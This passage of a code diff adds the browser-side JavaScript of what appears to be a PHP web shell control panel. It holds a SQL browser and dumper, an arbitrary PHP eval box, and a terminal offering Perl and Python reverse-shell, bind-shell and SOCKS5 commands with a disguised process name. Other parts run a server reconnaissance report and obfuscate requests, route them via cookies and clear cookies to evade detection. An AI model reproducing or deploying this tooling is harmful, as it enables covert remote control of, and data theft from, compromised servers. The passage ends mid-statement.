+ strgSaveStr('sqlRPP', elmById('frmPg').r.value);
+ strgSaveOpt('sqlSendAs', elmById('sqlCSSend').value);
+ strgSaveOpt('sqlLoadAs', elmById('sqlCSLoad').value);
+}
+
+function sqlAjxSnd(msg, cllbck, data) {
+ var elm = elmById('frmCnnct').elements;
+ if (!data) data = {};
+ data.a = 's';
+ for (var i = elm.length - 1; i >= 0; --i) {
+  var n = elm[i].name;
+  if (n !== '' && elm[i].value !== '' && !(n in data)) data[n] = elm[i].value;
+ }
+ var val = elmById('sqlCSLoad').value;
+ if (val !== 0) data.c = val;
+ elm = elmById('sqlCSSend');
+ data.l = elm.value;
+ return ajxSnd(msg, cllbck, null, data, elm.textValue);
+}
+
+function mkItmRow(name, val, chckd, fncOpn, fncDwn) {
+ var div = newElm('div', {
+  className: 'divItm'
+ });
+ div.appendChild(newElm('input', {
+  type: 'checkbox',
+  name: name + '[]',
+  value: val,
+  checked: chckd,
+  onchange: onChngCBState
+ }));
+ if (fncOpn) div.appendChild(newElm('a', {
+  href: '#',
+  className: 'cntrl actRe',
+  textContent: '\u27F3',
+  onclick: getStrctr
+ }));
+ if (fncDwn) div.appendChild(newElm('a', {
+  href: '#',
+  className: 'cntrl arwDwn',
+  onclick: fncDwn
+ }));
+ div.appendChild(newElm((fncOpn ? 'a' : 'span'), {
+  href: '#',
+  className: 'aMore',
+  title: val,
+  textContent: val,
+  onclick: fncOpn
+ }));
+ return div;
+}
+
+function cnnct() {
+ var frm = elmById('frmCnnct');
+ return sqlAjxSnd('Connect to ' + frm.e.textValue + ' server ' + frm.h.value + ' as ' + frm.u.value + ' (' + frm.p.value + ')', onCnnct);
+}
+
+function onCnnct(div, data) {
+ if ('e' in data) return uiChngMsg(div, data.e, 'Err');
+ elmById('frmSQL').q.value = '';
+ elmById('divCptn').textContent = '';
+ elm = elmById('frmPg').style;
+ if (elm.display === 'block') elm.display = 'none';
+ elm = elmById('tblHead');
+ if (elm.childNodes.length > 0) elm.removeChild(elm.tHead);
+ elm = elmById('tblData');
+ if (elm.tBodies.length > 0) elm.removeChild(elm.tBodies[0]);
+ elm = elmById('divSQLWrpLeft');
+ if (elm.style.display === 'block') {
+  elm.style.display = 'none';
+  var e = elmById('divSchm');
+  for (var i = e.childNodes.length - 1; i >= 0; --i) e.removeChild(e.lastChild);
+ }
+ if ('b' in data) {
+  elmById('divSchm').appendChild(mkItmRow('b', data.b, false, opnList));
+  onGetStrctr(div, data);
+ } else {
+  var frgm = document.createDocumentFragment();
+  for (var i = 0, c = data.length; i < c; ++i) frgm.appendChild(mkItmRow('b', data[i], false, opnList));
+  elmById('divSchm').appendChild(frgm);
+ }
+ elm.style.display = 'block';
+ elm = elmById('frmSQL').style;
+ if (elm.display !== 'flex') elm.display = 'flex';
+ if (!('b' in data)) uiDelMsg(div);
+}
+
+function opnList() {
+ var prnt = this.parentNode,
+  lst = prnt.lastChild;
+ if (lst.className === 'divLst') lst.style.display = lst.style.display === 'none' ? 'block' : 'none';
+ else prnt.childNodes[1].onclick();
+ return false;
+}
+
+function onChngCBState() {
+ var chldTotal = this.getAttribute('chldTotal') | 0,
+  chldChckd = this.getAttribute('chldChckd') | 0,
+  chldIndtrm = -1 * (this.getAttribute('chldIndtrm') | 0),
+  prnt = this.name === 'b[]' ? false : this.parentNode.parentNode.parentNode.firstChild;
+ if (chldIndtrm !== 0 || chldChckd !== chldTotal) {
+  this.setAttribute('chldIndtrm', 0);
+  --chldIndtrm;
+ }
+ this.setAttribute('chldChckd', this.checked ? chldTotal : 0);
+ chldChckd = this.checked ? chldTotal - chldChckd + 1 : -1 * chldChckd - 1;
+ if (chldTotal > 0) {
+  var inps = this.parentNode.lastChild.getElementsByTagName('input');
+  for (var i = inps.length - 1; i >= 0; --i)
+   if (inps[i].indeterminate || inps[i].checked !== this.checked) {
+    var ttl = inps[i].getAttribute('chldTotal') | 0;
+    if (ttl > 0) {
+     inps[i].setAttribute('chldIndtrm', 0);
+     inps[i].setAttribute('chldChckd', this.checked ? ttl : 0);
+    }
+    inps[i].indeterminate = false;
+    inps[i].checked = this.checked;
+   }
+ }
+ while (prnt) {
+  var crrntTotal = prnt.getAttribute('chldTotal') | 0,
+   crrntChckd = (prnt.getAttribute('chldChckd') | 0) + chldChckd,
+   crrntIndtrm = (prnt.getAttribute('chldIndtrm') | 0) + chldIndtrm;
+  prnt.setAttribute('chldChckd', crrntChckd);
+  prnt.setAttribute('chldIndtrm', crrntIndtrm);
+  if (crrntChckd === crrntTotal) {
+   prnt.checked = true;
+   ++chldChckd;
+   if (prnt.indeterminate) {
+    prnt.indeterminate = false;
+    --chldIndtrm;
+   }
+  } else {
+   if (prnt.checked) {
+    prnt.checked = false;
+    --chldChckd;
+   }
+   if (crrntChckd === 0 && crrntIndtrm === 0) {
+    if (prnt.indeterminate) {
+     prnt.indeterminate = false;
+     --chldIndtrm;
+    }
+   } else if (!prnt.indeterminate) {
+    prnt.indeterminate = true;
+    ++chldIndtrm;
+   }
+  }
+  prnt = prnt.name === 'b[]' ? false : prnt.parentNode.parentNode.parentNode.firstChild;
+ }
+}
+
+function listTables(prnt, data) {
+ var chckd = prnt.parentNode.firstChild.checked,
+  lst = data.t;
+ for (var i = 0, c = lst.length; i < c; ++i) {
+  var row = mkItmRow('t', lst[i][0], chckd, getData, opnList);
+  if (lst[i].length > 1) row.appendChild(newElm('span', {
+   className: 'spnRC',
+   textContent: lst[i][1]
+  }));
+  prnt.appendChild(row);
+ }
+}
+
+function listSchemas(prnt, data) {
+ var chckd = prnt.parentNode.firstChild.checked,
+  lst = data.s;
+ for (i = 0, c = lst.length; i < c; ++i) prnt.appendChild(mkItmRow('s', lst[i], chckd, opnList));
+}
+
+function getStrctr() {
+ var elm = this,
+  data = {},
+  name = [],
+  inp;
+ do {
+  elm = elm.parentNode;
+  inp = elm.firstChild;
+  name.push(inp.value);
+  data[inp.name.substr(0, 1)] = inp.value;
+  elm = elm.parentNode;
+ } while (elm.id !== 'divSchm');
+ if (elmById('cbCR').checked) data.r = '';
+ return sqlAjxSnd('Get structure of ' + name.reverse().join('.'), onGetStrctr, data);
+}
+
+function srchItm(elm, name, value) {
+ var chlds = elm.childNodes;
+ for (var i = 0, c = chlds.length; i < c; ++i) {
+  var inp = chlds[i].firstChild;
+  if (inp.name === name && inp.value === value) return chlds[i];
+ }
+ return false;
+}
+
+function onGetStrctr(div, data) {
+ if ('e' in data) return uiChngMsg(div, data.e, 'Err');
+ var cnt;
+ if ('f' in data) cnt = data.f.length;
+ else if ('t' in data) cnt = data.t.length;
+ else cnt = data.s.length;
+ if (cnt === 0) {
+  var t = 'Database',
+   v = [data.b];
+  if (('s' in data) && ('t' in data)) {
+   t = 'Schema';
+   v.push(data.s);
+  }
+  if ('f' in data) {
+   t = 'Table';
+   v.push(data.t);
+  }
+  return uiChngMsg(div, t + ' ' + v.join('.') + ' is empty', 'Inf');
+ }
+ var prnt = srchItm(elmById('divSchm'), 'b[]', data.b);
+ if (!prnt) return;
+ if (('t' in data) && ('s' in data)) {
+  if (prnt.lastChild.className !== 'divLst') return;
+  prnt = srchItm(prnt.lastChild, 's[]', data.s);
+  if (!prnt) return;
+ }
+ if ('f' in data) {
+  if (prnt.lastChild.className !== 'divLst') return;
+  prnt = srchItm(prnt.lastChild, 't[]', data.t);
+  if (!prnt) return;
+ }
+ if (prnt.lastChild.className === 'divLst') prnt.removeChild(prnt.lastChild);
+ var i = prnt.firstChild;
+ i.setAttribute('chldTotal', cnt);
+ i.setAttribute('chldChckd', i.checked ? cnt : 0);
+ i.setAttribute('chldIndtrm', 0);
+ prnt.appendChild(newElm('div', {
+  className: 'divLst'
+ }));
+ prnt = prnt.lastChild;
+ if ('f' in data) listFields(prnt, data);
+ else if ('t' in data) listTables(prnt, data);
+ else listSchemas(prnt, data);
+ uiDelMsg(div);
+}
+
+function listFields(prnt, data) {
+ var chckd = prnt.parentNode.firstChild.checked,
+  lst = data.f;
+ for (i = 0, c = lst.length; i < c; ++i) {
+  var row = mkItmRow('f', lst[i][0], chckd),
+   type = data.y[lst[i][1]];
+  if (type !== '') {
+   var div = newElm('div', {
+    className: 'divFldTp'
+   });
+   div.appendChild(newElm('span', {
+    className: 'aMore',
+    textContent: type
+   }));
+   row.appendChild(div);
+  }
+  prnt.appendChild(row);
+ }
+}
+
+function getData() {
+ var elm = this.parentNode,
+  data = {
+   t: elm.firstChild.value,
+   f: [],
+   o: 0,
+   r: elmById('frmPg').r.value
+  };
+ elm = elm.parentNode.parentNode;
+ if (elm.firstChild.name === 's[]') {
+  data.s = elm.firstChild.value;
+  data.b = elm.parentNode.parentNode.firstChild.value;
+ } else data.b = elm.firstChild.value;
+ elm = this.parentNode;
+ if (elm.lastChild.className === 'divLst') {
+  elm = elm.lastChild.childNodes;
+  for (var i = elm.length - 1; i >= 0; --i)
+   if (elm[i].firstChild.checked) data.f.unshift(elm[i].firstChild.value);
+ }
+ if (data.f.length === 0) data.f = '';
+ return sqlAjxSnd('Load data from table ' + data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t, onGetData, data);
+}
+
+function listData(caption, data) {
+ var tblHead = elmById('tblHead'),
+  tblData = elmById('tblData'),
+  cln = data.f.length;
+ if (tblData.tBodies.length > 0) tblData.removeChild(tblData.tBodies[0]);
+ elmById('divCptn').textContent = caption;
+ if (tblHead.childNodes.length > 0) tblHead.removeChild(tblHead.tHead);
+ var thead = document.createElement('thead'),
+  elm = thead.insertRow(0);
+ for (var i = 0; i < cln; ++i) elm.insertCell(-1).textContent = data.f[i];
+ tblHead.appendChild(thead);
+ data = data.r;
+ elm = document.createElement('tbody');
+ for (var i = 0, c = data.length; i < c; ++i) {
+  var tr = elm.insertRow(-1);
+  for (var j = 0; j < cln; ++j) tr.insertCell(-1).textContent = data[i][j];
+ }
+ tblData.appendChild(elm);
+ elm = tblHead.tHead.rows[0].cells;
+ data = tblData.tBodies[0].rows[0].cells;
+ for (var i = 0; i < cln; ++i) {
+  var tr = (elm[i].offsetWidth > data[i].offsetWidth ? elm[i].offsetWidth : data[i].offsetWidth) + 'px';
+  elm[i].style.minWidth = tr;
+  elm[i].style.width = tr;
+  data[i].style.minWidth = tr;
+  data[i].style.width = tr;
+ }
+}
+
+function onGetData(div, data) {
+ if ('e' in data) return uiChngMsg(div, data.e, 'Err');
+ if (data.f.length === 0) {
+  var v = data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t;
+  return uiChngMsg(div, data.o > 0 ? 'No more data in table ' + v : 'Table ' + v + ' is empty', 'Inf');
+ }
+ var isNotPgnbl = !('o' in data);
+ listData((isNotPgnbl ? 'Top ' + data.r.length + ' rows' : 'Rows ' + data.o + '-' + (data.o + data.r.length - 1)) + ' from table ' + data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t, data);
+ var frmPg = elmById('frmPg');
+ frmPg.b.value = data.b;
+ frmPg.s.value = ('s' in data) ? data.s : '';
+ frmPg.t.value = data.t;
+ frmPg.o.value = 0;
+ frmPg.o.disabled = isNotPgnbl;
+ frmPg.elements[3].disabled = isNotPgnbl;
+ frmPg.elements[5].disabled = isNotPgnbl;
+ if (frmPg.style.display !== 'block') frmPg.style.display = 'block';
+ uiDelMsg(div);
+}
+
+function chngPg(v) {
+ var elms = elmById('frmPg'),
+  chlds = [],
+  val = (elms.o.value | 0) + v * (elms.r.value | 0),
+  data = {
+   b: elms.b.value,
+   t: elms.t.value,
+   o: val > 0 ? val : 0,
+   r: elms.r.value | 0,
+   f: []
+  };
+ if (elms.s.value !== '') data.s = elms.s.value;
+ var prnt = srchItm(elmById('divSchm'), 'b[]', data.b);
+ if (prnt && prnt.lastChild.className === 'divLst') {
+  if ('s' in data) prnt = srchItm(prnt.lastChild, 's[]', data.s);
+  if (prnt && prnt.lastChild.className === 'divLst') {
+   prnt = srchItm(prnt.lastChild, 't[]', data.t);
+   if (prnt && prnt.lastChild.className === 'divLst') {
+    var chlds = prnt.lastChild.childNodes;
+    for (var i = 0, c = chlds.length; i < c; ++i)
+     if (chlds[i].firstChild.checked) data.f.push(chlds[i].firstChild.value);
+   }
+  }
+ }
+ if (data.f.length === 0) data.f = '';
+ return sqlAjxSnd('Load data from table ' + data.b + '.' + ('s' in data ? data.s + '.' : '') + data.t + ' (' + data.o + '-' + (data.o + data.r) + ')', onGetData, data);
+}
+
+function query() {
+ var v = elmById('frmSQL').q.value;
+ return v === '' ? false : sqlAjxSnd(v, onQuery, {
+  q: v
+ });
+}
+
+function onQuery(div, data) {
+ if ('e' in data) return uiChngMsg(div, data.e, 'Err');
+ if (data.f.length === 0) return uiChngMsg(div, 'Query successfully completed (' + data.q + ')', 'Inf');
+ elmById('frmPg').style.display = 'none';
+ listData(data.q, data);
+ uiDelMsg(div);
+}
+
+function getDumpList(data, elms, prfx) {
+ var n = 0,
+  indx = elms[0].firstChild.name.slice(0, 1) + '[' + prfx + ']';
+ data[indx] = [];
+ for (var i = 0, c = elms.length; i < c; ++i) {
+  if (elms[i].firstChild.checked) data[indx][n++] = elms[i].firstChild.value;
+  else if (elms[i].firstChild.indeterminate) {
+   data[indx].push(elms[i].firstChild.value);
+   getDumpList(data, elms[i].lastChild.childNodes, prfx + '-' + n);
+   n++;
+  }
+ }
+}
+
+function dump() {
+ var data = {
+   d: [],
+   o: elmById('slctDmpFrmt').value
+  },
+  elms = elmById('divSchm').childNodes,
+  n = 0;
+ for (var i = 0, c = elms.length; i < c; ++i) {
+  if (elms[i].firstChild.checked) data.d[n++] = elms[i].firstChild.value;
+  else if (elms[i].firstChild.indeterminate) {
+   data.d.push(elms[i].firstChild.value);
+   getDumpList(data, elms[i].lastChild.childNodes, n++);
+  }
+ }
+ if (n) sqlAjxSnd('Download SQL dump (close this message after start download)', onDump, data);
+}
+
+function onDump(div, data) {
+ uiChngMsg(div, data.e, 'Err');
+}
+
+function onPHPKeyDwn(e) {
+ if (e.ctrlKey && e.keyCode === 13) return evl();
+}
+
+function onPHPResKeyDwn(e) {
+ if (e.ctrlKey && e.keyCode === 65) {
+  uiSlctTxt('prePHP');
+  e.preventDefault();
+ }
+}
+
+function uiChngCmps() {
+ var lbl = elmById('aCmps'),
+  frm = elmById('divPHP').style;
+ if (lbl.className === 'cmpsRow') {
+  lbl.className = 'cmpsCol';
+  frm.flexDirection = 'column';
+ } else {
+  lbl.className = 'cmpsRow';
+  frm.flexDirection = 'row';
+ }
+ return false;
+}
+
+function evl() {
+ var frm = elmById('frmPHP');
+ if (frm.e.value === '') elmById('prePHP').innerHTML = '';
+ else ajxSnd('Eval PHP code', onEvl, frm, {
+  a: 'p'
+ }, elmById('slctPHPCS').value);
+ return false;
+}
+
+function onEvl(div, data) {
+ var elm = elmById('prePHP'),
+  chr = data.slice(-1);
+ if ('createShadowRoot' in elm) {
+  if (elm.shadowRoot === null) elm.createShadowRoot();
+  elm = elm.shadowRoot;
+ }
+ if (chr === "\x06" && elmById('cbClnInp').checked) elmById('txtPHP').value = '';
+ if (elmById('cbClnOut').checked) elm.innerHTML = '';
+ if (chr === "\x15" && data.slice(0, -3) === '' && !elmById('frmPHP').h.checked) data = '\nFatal error: You have syntax error in PHP code\n';
+ else data = data.slice(0, -3);
+ if (elmById('cbHTML').checked) {
+  var divRst = document.createElement('iframe');
+  divRst.style = 'all:initial;isolation:isolate;width:100%;height:100%;';
+  divRst.srcdoc = data;
+  elm.appendChild(divRst);
+ } else elm.appendChild(document.createTextNode(data));
+ uiDelMsg(div);
+}
+
+function phpSaveState() {
+ strgSaveBool('phpChngCmps', elmById('aCmps').className === 'cmpsCol');
+ strgSaveBool('phpClnInp', 'cbClnInp');
+ strgSaveBool('phpClnOut', 'cbClnOut');
+ strgSaveBool('phpHTML', 'cbHTML');
+ var frm = elmById('frmPHP');
+ strgSaveBool('phpSilent', frm.h.checked);
+ strgSaveOpt('phpSendAs', elmById('slctPHPCS').value);
+ strgSaveOpt('phpLoadAs', frm.c.value);
+}
+
+function phpRestoreState() {
+ if (sessionStorage.getItem('phpChngCmps')) uiChngCmps();
+ strgRstrChck('phpClnInp', 'cbClnInp');
+ strgRstrChck('phpClnOut', 'cbClnOut');
+ strgRstrChck('phpHTML', 'cbHTML');
+ var frm = elmById('frmPHP');
+ strgRstrChck('phpSilent', frm.h);
+ strgRstrVal('phpSendAs', 'slctPHPCS');
+ strgRstrVal('phpLoadAs', frm.c);
+}
+var trmHist = strgRstrArr('trmHist'),
+ trmIndx = trmHist.length;
+
+function onTrmClick(e) {
+ if (e.target === elmById('divTrm')) elmById('inpTrm').focus();
+}
+
+function onTrmResKeyDwn(e) {
+ if (e.ctrlKey && e.keyCode === 65) {
+  uiSlctTxt('preTrm');
+  e.preventDefault();
+ }
+}
+
+function onTrmInpKeyDwn(e) {
+ var frm = elmById('frmTrm'),
+  inp = frm.e;
+ if (e.keyCode === 38) {
+  if (trmIndx > 0) inp.value = trmHist[--trmIndx];
+ } else if (e.keyCode === 40) {
+  var val = trmHist.length;
+  if (trmIndx < val - 1) inp.value = trmHist[++trmIndx];
+  else {
+   inp.value = '';
+   if (trmIndx < val) ++trmIndx;
+  }
+ } else if (e.ctrlKey && e.keyCode === 76) elmById('preTrm').textContent = '';
+ else if (e.keyCode === 13) exec();
+ else return;
+ e.preventDefault();
+}
+
+function prntMsg(msg) {
+ if(elmById('cbIT').checked)
+    elmById('preTrm').textContent = reduce(elmById('spnUsrHst').title) + ':' + reduce(elmById('spnPth').title) + '$ ' + msg + '\n' + elmById('preTrm').textContent;
+ else{
+    elmById('preTrm').textContent += reduce(elmById('spnUsrHst').title) + ':' + reduce(elmById('spnPth').title) + '$ ' + msg + '\n';
+    var trm = elmById('divTrm');
+    trm.scrollTop = trm.scrollHeight;
+ }
+ return false;
+}
+
+function exec() {
+ var frm = elmById('frmTrm'),
+  cmd = frm.e.value.trim(),
+  val = cmd.match(/!(!|(?:-?[0-9]+))/);
+ if (val !== null) {
+  val = val[1] | 0;
+  if (val >= 0) --val;
+  cmd = trmHist[val < 0 ? trmHist.length + val : val];
+  frm.e.value = cmd;
+ }
+ if (trmHist.slice(-1)[0] !== cmd) trmHist.push(cmd);
+ trmIndx = trmHist.length;
+ if (cmd === '?') {
+  val = '  For more information run command without params.\n\n';
+  prntMsg('?\n\n' + 'cls, clear\n' + '  Clear terminal window.\n' + '  * You can clear terminal window pressing Ctrl+L\n\n' + 'history\n' + '       Show all comands.\n' + '  n    Show last n commands.\n' + '  !!   Execute last command.\n' + '  !n   Execute command number n. If value negative then counting starts at end.\n' + '  * You can navigate through history using UP and DOWN keys.\n\n' + 'report\n' + '  Create server information report.\n' + '  For more information run command with question param.\n\n' + 'socks5.perl\n' + '  Run Socks5 server using Perl.\n' + val + 'bindport.perl\n' + '  Open port and provide shell access for connected client using Perl.\n' + val + 'backconnect.perl\n' + '  Connect to client and provide shell access for him using Perl.\n' + val + 'socks5.python\n' + '  Run Socks5 server using Python.\n' + val + 'bindport.python\n' + '  Open port and provide shell access for connected client using Python.\n' + val + 'backconnect.python\n' + '  Connect to client and provide shell access for him using Python.\n' + val);
+ } else if (cmd === 'cls' || cmd === 'clear') elmById('preTrm').textContent = '';
+ else {
+  val = cmd.match(/history ?([0-9]*)/i);
+  if (val !== null) {
+   val = val[1] | 0;
+   var s = cmd + '\n';
+   for (var c = trmHist.length, i = (val > 0 && c > val) ? c - val : 0; i < c; ++i) s += '\t' + (i + 1) + '\t' + trmHist[i] + '\n';
+   prntMsg(s);
+  } else {
+   val = cmd.split(' ', 4);
+   var usg = cmd + '\n' + 'Usage:\n  ' + val[0],
+    opt = ' <port> [options]\nOptions (option value can\'t contain whitespace):\n  -i <file>  Use interpreter <file>. Default: ',
+    perl = '<?php echo NIX?"/usr/bin/perl":"perl.exe";?>\n',
+    pthn = '<?php echo NIX?"/usr/bin/python":"python.exe";?>\n',
+    opta = '  -a <addr>  Listen only on IP address <addr>. Default listening on all adresses\n',
+    optn = '  -n <name>  Set process name to <name>. Default value is secret ;)\n',
+    opts = '  -s <file>  Use shell <file>. Default: <?php echo NIX?"/bin/sh":"cmd";?>\n',
+    optt = '  -t         Open PTY\n',
+    optl = '  -s <u:p>   Secure with authentication (u - username, p - password)\n',
+    ign = '     u - Users and Groups;\n     e - Environment;\n     p - Processes;\n     n - Network;\n';
+   if (val[0] === 'backconnect.perl' && val.length < 3) prntMsg(usg + ' <ip>' + opt + perl + opts + optn);
+   else if (val[0] === 'bindport.perl' && val.length < 2) prntMsg(usg + opt + perl + opta + opts + optn);
+   else if (val[0] === 'socks5.perl' && val.length < 2) prntMsg(usg + opt + perl + opta + optl + optn);
+   else if (val[0] === 'backconnect.python' && val.length < 3) prntMsg(usg + ' <ip>' + opt + pthn + opts + optt);
+   else if (val[0] === 'bindport.python' && val.length < 2) prntMsg(usg + opt + pthn + opta + opts + optt);
+   else if (val[0] === 'socks5.python' && val.length < 2) prntMsg(usg + opt + pthn + opta + optl);
+   else if (val[0] === 'report' && val[1] === '?') prntMsg(usg + ' [options]\nOptions:\n  -f <file>   Save report to <file>\n  -s [flags]  Skip some information\n     Flags:\n<?php echo NIX?'o-OS Identification;\n l-Langs;\n c-CPU;\n r-Cron;\n h-Histories;\n f-File System;\n s-SUID Files;\n':'s-System Info;\n t-Tasks;\n r-Share;\n';?>' + ign);
+   else {
+    ajxSnd(reduce(elmById('spnUsrHst').title) + ':' + reduce(elmById('spnPth').title) + '$ ' + cmd, onExec, frm, {
+     a: 't',
+     p: elmById('spnPth').title
+    }, elmById('slctTrmCS').value);
+   }
+  }
+ }
+ frm.e.value = '';
+ return false;
+}
+
+function onExec(div, data) {
+ var cmd = div.childNodes[1].textContent.slice(0, -2);
+ if (data === '\x03\x1E') return uiChngMsg(div, 'Error in command: ' + cmd, 'Err');
+ data = data.slice(0, -3);
+ var pos = data.lastIndexOf('\x03\x1E\x02\x0A');
+ if (pos > -1) {
+  var inf = data.slice(pos + 4).split('\n', 3);
+  elmById('spnUsrHst').title = inf[0] + '@' + inf[1];
+  elmById('spnPth').title = inf[2];
+  elmById('spnUsrHst').textContent = reduce(elmById('spnUsrHst').title);
+  elmById('spnPth').textContent = reduce(elmById('spnPth').title);
+  data = data.slice(0, pos);
+ } else data += '\n';
+ if(elmById('cbIT').checked){
+	elmById('divTrm').append(elmById('preTrm'));
+	elmById('preTrm').textContent = cmd + '\n' + data + '\n' + elmById('preTrm').textContent;
+ }
+ else{
+	elmById('divTrm').prepend(elmById('preTrm'));
+	elmById('preTrm').textContent += cmd + '\n' + data + '\n';
+	pos = elmById('divTrm');
+	pos.scrollTop = pos.scrollHeight;
+ }
+ uiDelMsg(div);
+}
+
+function trmSaveState() {
+ if (exeFuncs.length === 0) return;
+ var e = elmById('frmTrm');
+ strgSaveStr('trmShell', e.s.value);
+ strgSaveBool('trmSilent', e.h.checked);
+ strgSaveOpt('trmFunc', e.f.value);
+ strgSaveOpt('trmLoadAs', e.c.value);
+ strgSaveOpt('trmSendAs', elmById('slctTrmCS').value);
+ strgSaveStr('trmPath', elmById('spnPth').title);
+ strgSaveArr('trmHist', trmHist);
+}
+
+function trmRestoreState() {
+ var cnt = exeFuncs.length;
+ if (cnt === 0) {
+  elmById('tabTrm').style.display = 'none';
+  return;
+ }
+ var frm = elmById('frmTrm'),
+  val = sessionStorage.getItem('trmFunc') | 0;
+ for (var i = 0; i < cnt; ++i) {
+  var opt = new Option(exeFuncs[i][1], exeFuncs[i][0]);
+  if (exeFuncs[i][0] === val) opt.selected = true;
+  frm.f.add(opt);
+ }
+ elmById('spnUsrHst').title = exeFuncs[0][2];
+ elmById('spnUsrHst').textContent = reduce(elmById('spnUsrHst').title);
+ val = sessionStorage.getItem('trmPath');
+ elmById('spnPth').title = val === null ? exeFuncs[0][3] : val;
+ elmById('spnPth').textContent = reduce(elmById('spnPth').title);
+ strgRstrVal('trmShell', frm.s);
+ strgRstrChck('trmSilent', frm.h);
+ strgRstrVal('trmSendAs', 'slctTrmCS');
+ strgRstrVal('trmLoadAs', frm.c);
+}
+
+function reduce(str, chr = 5){
+ return (document.body.style.width == '' && str.length > 50 ? str.substring(0, chr) + '…' + str.substring(str.length - chr) : str);
+}
+
+function uiUpdInf(chld) {
+ var div = elmById('divInfo');
+ div.removeChild(div.lastChild);
+ div.appendChild(chld);
+}
+
+function onInfMain(div, data) {
+ var tbl = newElm('table', {
+  id: 'tblInf'
+ });
+ for (var i = 0, l = data.length; i < l; ++i) {
+  if (i > 0) tbl.insertRow(-1).appendChild(newElm('th', {
+   colSpan: 2
+  }));
+  for (var key in data[i]) {
+   var tr = tbl.insertRow(-1);
+   tr.appendChild(newElm('th', {
+    textContent: key
+   }));
+   tr.insertCell(1).textContent = data[i][key];
+  }
+ }
+ uiUpdInf(tbl);
+ uiDelMsg(div);
+}
+
+function onInfPHP(div, data) {
+ var tbl = document.createElement('table');
+ tbl.id = 'tblInf';
+ for (var sct in data) {
+  var tr = tbl.insertRow(-1);
+  tr.appendChild(newElm('th', {
+   colSpan: 2,
+   textContent: sct
+  }));
+  for (var key in data[sct]) {
+   tr = tbl.insertRow(-1);
+   tr.appendChild(newElm('th', {
+    textContent: key
+   }));
+   tr.insertCell(1).textContent = data[sct][key];
+  }
+ }
+ uiUpdInf(tbl);
+ uiDelMsg(div);
+}
+
+function ajxSnd(msg, clbck, frm, data, chrst) {
+	
+	RO = elmById('cbRO').checked;
+	RR = elmById('cbRR').checked;
+	TM = elmById('cbTM').checked;
+	OI = elmById('cbOI').checked;
+	
+	 function obfuscate(data) {
+	  if (obfKey === false || data.length < 2) return data;
+	  var r = [],
+	   l = data.length;
+	  data = data.split('');
+	  for (var i = 0; i < l; ++i) {
+	   var c = (i % 2 === 0) ? data.pop() : data.shift();
+	   r.push(c === obfKey ? '' : c);
+	  }
+	  return r.join(obfKey);
+	 };
+	
+	 function cancel() {
+	  document.body.removeChild(reqIfrm);
+	  uiDelMsg(msgDiv);
+	  return false;
+	 };
+	
+	 function onResp() {
+	  deleteAllCookies();
+
+	  msgDiv.firstChild.onclick = uiClsMsg;
+	  var doc = reqIfrm.contentDocument;
+	  var xr = reqIfrm.getAttribute('xr');
+	  var xc = reqIfrm.getAttribute('xc');
+	  var resp = xr ? xr : doc.body.textContent;
+	  var cset = xc ? xc : doc.characterSet;
+	  var data = RO ? resp : getValue(resp);
+	  document.body.removeChild(reqIfrm);
+	  
+	  if (data.slice(0, 2) === '\x01\x02') {
+	   if (data.slice(-3) === '\x17\x04\x10' && data.indexOf('\x03\x1E')) data = data.slice(2, -3);
+	   else data = false;
+	  } else try {
+	   data = JSON.parse(data);
+	  } catch (e) {
+	   data = false;
+	  }
+	  if (data === false) uiNetErrMsg(msgDiv);
+	  else if (clbck) clbck.call(frm, msgDiv, data, cset);
+	  else uiDelMsg(msgDiv);
+	 };
+	 
+	 var msgDiv = uiMsg(msg),
+	  obfKey = false,
+	  reqIfrm = newElm('iframe', {
+	   src: '',
+	   name: 'ifrm' + (new Date().getTime())
+	  }),
+	  reqFrm = newElm('form', {
+	   acceptCharset: (chrst ? chrst : 'UTF-8'),
+	   action: window.location.href,
+	   method: 'post',
+	   target: reqIfrm.name
+	  }),
+	  elm;
+
+	 if (RO) data.ro = '1';
+	 if (TM) data.tm = '1';
+	 if (obfKey !== false) data.k = obfKey;
+	 elm = elmById('frmCstEnv');
+	 if (elm.e.checked && elm.i.value !== '') {
+	  data.j = [elm.f.value, elm.s.value, elm.i.value, ''];
+	  if (elm.n.checked) data.j[3] = 'n';
+	  if (elm.c.checked) data.j[3] += 'C';
+	 }
+	 for (var key in data)
+	  if (Array.isArray(data[key]))
+	   for (var i = 0, c = data[key].length; i < c; ++i) reqFrm.appendChild(newElm('input', {
+	    type: 'hidden',
+	    name: RR ? key + '['+ i +']' : setName(key + '['+ i +']'),
+	    value: RR ? data[key][i]: setValue(data[key][i])
+	   }));
+	  else reqFrm.appendChild(newElm('input', {
+	   type: 'hidden',
+	   name: RR ? key : setName(key),
+	   value: RR ? data[key] : setValue(data[key])
+	  }));
+	 if (frm)
+	  for (var i = frm.elements.length - 1; i >= 0; --i) {
+	   elm = frm.elements[i];
+	   if (elm.name === '' || elm.disabled) continue;
+	   if (elm.tagName === 'INPUT') {
+	    if ((elm.type === 'checkbox' || elm.type === 'radio') && !elm.checked) continue;
+	    if (elm.type === 'file') {
+			if(RR){
+		     reqFrm.enctype = 'multipart/form-data';
+		     reqFrm.appendChild(elm.cloneNode(true));
+			}
+	     continue;
+	    }
+	   }
+	   if (elm.value !== '' || elm.tagName === 'TEXTAREA') reqFrm.appendChild(newElm('input', {
+	    type: 'hidden',
+	    name: RR ? elm.name : setName(elm.name),
+	    value: RR ? elm.value : setValue(elm.value)
+	   }));
+	  }
+
+	 document.body.appendChild(reqFrm);
+	 addEncKey(reqFrm);
+	 
+	 status = false;
+	 if(COOKIE && reqFrm.enctype != 'multipart/form-data'){
+		status = submitViaCookie(reqFrm, false);
+		if(status == 'SEND'){
+			elements = reqFrm.childNodes;
+			while(elements.length)
+				for(i = 0; i < elements.length; i++)
+					reqFrm.removeChild(elements[i]);
+			reqFrm.method = 'get';
+		}
+		else
+			reqFrm.method = 'post';
+	 }
+	
+	 document.body.appendChild(reqIfrm);
+
+	 if(status != 'CANCEL'){
+		
+		if(OI && reqFrm.method == 'get')
+			reqIfrm.src = reqFrm.action;
+
+		else if(!data.hasOwnProperty('d')){
+			var xhr = new XMLHttpRequest();
+			xhr.open(reqFrm.method, '', false);
+			xhr.send(new FormData(reqFrm));
+			reqIfrm.setAttribute('xr', xhr.responseText);
+			reqIfrm.setAttribute('xc', xhr.getResponseHeader('content-type').split('=')[1]);
+			reqIfrm.srcdoc = '';
+		}
+		else
